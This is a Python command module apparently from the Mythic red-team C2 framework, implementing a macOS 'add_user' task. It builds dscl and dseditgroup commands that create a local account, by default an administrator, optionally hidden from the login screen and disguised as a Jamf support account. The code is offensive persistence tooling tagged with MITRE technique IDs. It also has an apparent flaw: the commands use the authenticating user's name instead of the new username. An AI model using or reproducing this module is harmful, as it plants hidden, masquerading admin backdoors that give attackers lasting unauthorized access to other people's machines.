from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class AddUserArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "password": CommandParameter(
                name="New Password",
                type=ParameterType.String,
                description="p@55w0rd_here for new user",
                required=False,
                default_value="p@55w0rd_here",
                ui_position=4
            ),
            "passwd": CommandParameter(
                name="Authenticate with this password",
                type=ParameterType.Credential_Value,
                description="password of the user that will execute the commands",
                ui_position=2
            ),
            "user": CommandParameter(
                name="Authenticate as this user",
                type=ParameterType.Credential_Account,
                description="username that will execute the commands",
                ui_position=1
            ),
            "createprofile": CommandParameter(
                name="createprofile",
                type=ParameterType.Boolean,
                required=False,
                default_value=False,
                description="create a user profile or not",
            ),
            "usershell": CommandParameter(
                name="usershell",
                type=ParameterType.String,
                description="which shell environment should the new user have",
                required=False,
                default_value="/bin/bash",
                ui_position=5
            ),
            "primarygroupid": CommandParameter(
                name="primarygroupid",
                type=ParameterType.Number,
                required=False,
                description="POSIX primary group id for the new account",
                default_value=80,
            ),
            "uniqueid": CommandParameter(
                name="uniqueid",
                type=ParameterType.Number,
                required=False,
                default_value=403,
                description="POSIX unique id for the user",
            ),
            "homedir": CommandParameter(
                name="homedir",
                type=ParameterType.String,
                required=False,
                description="/Users/.jamf_support",
            ),
            "realname": CommandParameter(
                name="realname",
                type=ParameterType.String,
                required=False,
                default_value="Jamf Support User",
                description="Full user name",
            ),
            "username": CommandParameter(
                name="New Username",
                type=ParameterType.String,
                required=False,
                default_value=".jamf_support",
                description="POSIX username for account",
                ui_position=3
            ),
            "hidden": CommandParameter(
                name="hidden",
                type=ParameterType.Boolean,
                required=False,
                default_value=False,
                description="Should the account be hidden from the logon screen",
            ),
            "admin": CommandParameter(
                name="admin",
                type=ParameterType.Boolean,
                required=False,
                default_value=True,
                description="Should the account be an admin account",
            ),
        }

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class AddUserCommand(CommandBase):
    cmd = "add_user"
    needs_admin = True
    help_cmd = "add_user"
    description = "Add a local user to the system by wrapping the Apple binary, dscl."
    version = 2
    author = "@its_a_feature_"
    argument_class = AddUserArguments
    attackmapping = ["T1136", "T1169"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if task.args.get_arg("hidden"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dscl . create /Users/{} IsHidden 1".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        else:
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dscl . create /Users/{}".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} UniqueID {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("uniqueid")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} PrimaryGroupID {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("primarygroupid")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} NFSHomeDirectory \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("homedir")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} RealName \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("realname")
            ),
            artifact_type="Process Create",
        )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . create /Users/{} UserShell {}".format(
                task.args.get_arg("user"),
                task.args.get_arg("usershell")
            ),
            artifact_type="Process Create",
        )
        if task.args.get_arg("admin"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="dseditgroup -o edit -a {} -t user admin".format(task.args.get_arg("user")),
                artifact_type="Process Create",
            )
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="dscl . passwd /Users/{} \"{}\"".format(
                task.args.get_arg("user"),
                task.args.get_arg("password")
            ),
            artifact_type="Process Create",
        )
        if task.args.get_arg("createprofile"):
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="mkdir \"{}\"".format(task.args.get_arg("homedir")),
                artifact_type="Process Create",
            )
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="cp -R \"/System/Library/User Template/English.lproj/\" \"{}\"".format(
                    task.args.get_arg("homedir")
                ),
                artifact_type="Process Create",
            )
            resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="chown -R {}:staff \"{}\"".format(
                    task.args.get_arg("user"),
                    task.args.get_arg("homedir")
                ),
                artifact_type="Process Create",
            )
        return task

    async def process_response(self, response: AgentResponse):
        pass
